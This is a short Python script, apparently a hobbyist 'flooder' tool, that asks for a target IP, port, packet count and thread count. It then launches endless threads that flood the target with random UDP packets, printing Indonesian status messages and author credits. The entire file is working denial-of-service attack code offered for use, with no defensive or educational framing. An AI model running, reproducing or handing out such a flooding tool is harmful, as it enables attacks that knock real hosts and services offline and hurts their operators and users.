import random
import socket
import threading
import os,sys

os.system("clear")
print("\033[31mCoded By Rifqi")
print("""\033[31m
 _             _                 
 | |    ___ ___| |__   __ _ _ __  
 | |   / _ \_  / '_ \ / _` | '_ \ 
 | |__|  __// /| | | | (_| | | | |
 |_____\___/___|_| |_|\__,_|_| |_|
                                  """)

print("o")
print("Tools By Omar")
ip = str(input(" Target IP:"))
port = int(input(" Target Port:"))
choice = str(input(" (y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))

os.system("clear")
def run():
    data = random._urandom(1800)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"|Paket dari Lezhan & Rifqi !!!|")
        except:
            print("[X] |Paket di Terima !!!|")

def run2():
    data = random._urandom(1080)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"|Paket dari Lezhan & Rifqi !!!|")
        except:
            s.close()
            print("[X] |Paket di Terima !!!|")

def run3():
    data = random._urandom(1025)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"|Paket dari Lezhan & Rifqi !!!|")
        except:
            s.close()
            print("[X] |Paket di Terima !!!|")

def run4():
    data = random._urandom(2080)
    i = random.choice(("[•]","[•]","[•]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"|Paket dari Lezhan & Rifqi !!!|")
        except:
            s.close()
            print("[X] |Paket di Terima !!!|")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
